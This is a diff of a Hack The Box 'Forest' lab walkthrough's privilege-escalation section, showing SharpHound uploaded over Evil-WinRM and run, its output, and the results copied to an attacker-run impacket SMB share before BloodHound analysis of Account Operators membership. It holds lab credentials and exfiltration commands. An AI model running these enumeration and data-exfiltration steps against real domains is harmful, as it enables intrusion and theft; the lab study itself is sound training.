@@ -180,25 +180,47 @@ hashcat -m 18200 svc.kerb /usr/share/wordlists/rockyou.txt --force
 # Privilage Escalation
 - run SharpHound to collect data for BloodHound upload it with
 ```
-─$ bloodhound-python -c All -u svc-alfresco -p s3rvice -d htb.local -ns 10.10.10.161 --zip 
-INFO: Found AD domain: htb.local
-INFO: Getting TGT for user
-WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (htb.local:88)] [Errno -2] Name or service not known
-INFO: Connecting to LDAP server: FOREST.htb.local
-INFO: Found 1 domains
-INFO: Found 1 domains in the forest
-INFO: Found 2 computers
-INFO: Connecting to LDAP server: FOREST.htb.local
-INFO: Found 32 users
-INFO: Found 76 groups
-INFO: Found 2 gpos
-INFO: Found 15 ous
-INFO: Found 20 containers
-INFO: Found 0 trusts
-INFO: Starting computer enumeration with 10 workers
-INFO: Querying computer: EXCH01.htb.local
-INFO: Querying computer: FOREST.htb.local
-INFO: Done in 00M 36S
-INFO: Compressing output into 20230806032419_bloodhound.zip
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> upload SharpHound.exe
+                                        
+Info: Uploading /home/kali/BloodHound/Collectors/SharpHound.exe to C:\Users\svc-alfresco\appdata\local\temp\SharpHound.exe
+                                        
+Data: 1395368 bytes of 1395368 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> ./SharpHound.exe -c all
+2023-08-05T17:42:03.2895403-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
+2023-08-05T17:42:03.4770686-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2023-08-05T17:42:03.4926804-07:00|INFORMATION|Initializing SharpHound at 5:42 PM on 8/5/2023
+2023-08-05T17:42:03.8832903-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for htb.local : FOREST.htb.local
+2023-08-05T17:42:04.0395347-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2023-08-05T17:42:04.3520382-07:00|INFORMATION|Beginning LDAP search for htb.local
+2023-08-05T17:42:04.4301627-07:00|INFORMATION|Producer has finished, closing LDAP channel
+2023-08-05T17:42:04.4301627-07:00|INFORMATION|LDAP channel closed, waiting for consumers
+2023-08-05T17:42:34.5708606-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 41 MB RAM
+2023-08-05T17:42:47.2427517-07:00|INFORMATION|Consumers finished, closing output channel
+Closing writers
+2023-08-05T17:42:47.2896313-07:00|INFORMATION|Output channel closed, waiting for output task to complete
+2023-08-05T17:42:47.4458809-07:00|INFORMATION|Status: 161 objects finished (+161 3.744186)/s -- Using 48 MB RAM
+2023-08-05T17:42:47.4458809-07:00|INFORMATION|Enumeration finished in 00:00:43.1046565
+2023-08-05T17:42:47.5708801-07:00|INFORMATION|Saving cache with stats: 118 ID to type mappings.
+ 118 name to SID mappings.
+ 0 machine sid mappings.
+ 2 sid to domain mappings.
+ 0 global catalog mappings.
+2023-08-05T17:42:47.5865083-07:00|INFORMATION|SharpHound Enumeration Completed at 5:42 PM on 8/5/2023! Happy Graphing!
 ```
+- use smbserver.py to exfil the results
+```
+impacket-smbserver share . -smb2support -username df -password df
+```
+- now on the forest
+```
+net use \\10.10.16.5\share /u:df df
+copy 20230805174246_BloodHound.zip \\10.10.16.5\share\
+```
+- There should be JSON files outputted in the folder, which can be uploaded to the bloodhound GUI. Search for the svc-alfresco user and mark it as owned. - Double clicking on the node should display it's properties on the right. It's found that svc-alfresco is a member of nine groups
+through nested membership. Click on 9 to reveal the membership graph.
+- found Account Operators , which is a privileged AD group
+- members of the Account Operators group are allowed create and modify users and add them to non-protected groups. Let's note this and look at the paths to Domain Admins. Click on Queries and select Shortest Path to High Value targets
 - 
